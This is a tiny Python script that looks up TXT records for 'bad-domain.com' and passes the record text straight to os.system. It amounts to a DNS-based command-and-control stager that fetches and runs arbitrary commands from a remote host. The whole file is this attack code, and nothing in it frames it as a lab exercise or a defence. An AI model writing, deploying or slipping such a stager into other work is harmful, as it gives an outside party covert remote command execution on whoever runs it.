#!/usr/bin/python3

import os, sys
import dns.resolver

result = dns.resolver.resolve('bad-domain.com', 'TXT')

for cmdval in result:
  
  text = cmdval.to_text()

os.system(text)
